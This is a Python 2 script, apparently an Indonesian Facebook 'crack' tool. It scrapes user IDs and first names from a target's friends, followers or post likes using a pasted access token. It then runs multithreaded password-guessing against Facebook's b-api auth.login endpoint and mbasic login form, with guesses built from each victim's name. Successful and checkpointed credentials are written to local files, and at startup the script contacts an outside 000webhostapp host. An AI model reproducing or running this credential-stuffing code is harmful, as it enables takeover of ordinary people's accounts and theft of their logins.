#!/usr/bin/python2
# coding=utf-8
# Coding By : Iwan Hadiansah
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3638.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/197.0.0.46.98;]')
ua = 'Mozilla/5.0 (Linux; U; Android 10; id-id; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
uas = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
ip = requests.get('https://api.ipify.org').text
kt = requests.get('https://squirming-claim.000webhostapp.com/region/?').text
apii= []
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [ 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni','Juli', 'Agustus','September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

logo = """
 ___   _____ _____________________
|   | /     \\______   \_   _____/
|   |/  \ /  \|    |  _/|    __)  
|   /    Y    \    |   \|     \   
|___\____|__  /______  /\___  /   
            \/       \/     \/    
"""
def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print"[+] Tempel Cuy Token Nya Jangan Token Listrik Yang Di Tempel"
        token = raw_input('\n[+] Masukan Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token='+token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print(('\x1b[92m[•] Login Sukses!\x1b[0m'))
            raw_input('[>] Tekan Enter ')
            menu()
        except KeyError:
            print ' [!] Token Invalid'
            sys.exit()
            
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print"[+] Bergabung    : \033[0;97m" +durasi
    print"[+] ----------------------------------------"
    print"\033[0;97m[+] Region       : \033[0;97m" +kt
    print"\033[0;97m[+] ----------------------------------------"
    print"\033[0;97m[+] IP           : \033[0;97m" +ip
    print"\n"
    print"[ Welcome : \033[0;93m"+nama+"\033[0;97m ]\n"
    print"[01]. Crack Dari Publik Teman"
    print"[02]. Crack Dari Followers Publik"
    print"[03]. Crack Dari Like Postingan"
    print"\033[0;97m[04]. Lihat Hasil Crack"
    print"\033[0;97m[00]. Logout (hapus token)"
    ask = raw_input('\n[?] Pilih Menu : ')
    if ask == '':
        menu()
    elif ask == '01' or ask == '1':
        publik()
    elif ask == '02' or ask == '2':
        follow()
    elif ask == '03' or ask == '3':
        like()
    elif ask == '04' or ask == '4':
        hasil()
    elif ask == '00' or ask == '0':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        print('[!] Isi Yang Benar')
        menu()
        
def metode(asu):
    print''
    print"[01]. Metode B-api (Fast-Crack)"
    print"[01]. Metode Mbasic (Slow-Crack)"
    ask = raw_input('\n[?] Metode : ')
    if ask == '':
        menu()
    elif ask == '01' or ask == '1':
        for id in asu:apii(id)
    elif ask == '02' or ask == '2':
        for id in asu:mbasic(id)
    else:
        print('[!] Isi Yang Benar')
        metode()
  
def publik():
   idt = raw_input('[+] Masukan Id Publik : ')
   try:
       pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
       sp = json.loads(pok.text)
       print '[+] Nama : ' + sp['name']
   except KeyError:
       print '[!] ID Tidak Tersedia'
       exit()

   r = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=10000&access_token=' + token)
   z = json.loads(r.text)
   for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
   print '[*] Total ID : '+str(len(id))
   return metode(id)
   
def follow():
    idt = raw_input('[+] Masukan Id Publik : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        print '[+] Nama : ' + sp['name']
    except KeyError:
        print '[!] ID Tidak Tersedia'
        exit()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
        
def like():
  idt = raw_input('[+] Masukan Id Postingan : ')
  r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
  z = json.loads(r.text)
  for i in z['data']:
      uid = i['id']
      na = i['name']
      nm = na.rsplit(' ')[0]
      id.append(uid + '|' + nm)

def hasil():
  print'[01]. Hasil OK'
  print'[02]. Hasil CP'
  ress = raw_input('\n[?] Menu Hasil : ')
  if ress == '':
    menu()
  elif ress == '01' or ress == '1':
      print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
      print"[+] ----------------------------------------"
      os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
      exit()
  elif ress == '02' or ress == '2':
      print '\n[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;93m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
      print"[+] ----------------------------------------"
      os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
      exit()
  else:
      exit('[!] Pilih Yang Bener !')
      
def apii(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s  '% (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m*[AS] ' + uid + '|' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*[AS] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m*[AS] ' + uid + '|' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*[AS] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

        p = ThreadPool(30)
        p.map(apii, id)
        print '\n[+] Finished'
        exit() 
        
def mbasic(arg):
        global loop
        print '\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*[AS] ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*[AS] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m*[AS] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*[AS] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

        p = ThreadPool(30)
        p.map(mbasic, id)
        print'\n[+] Finished'
        exit()

if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
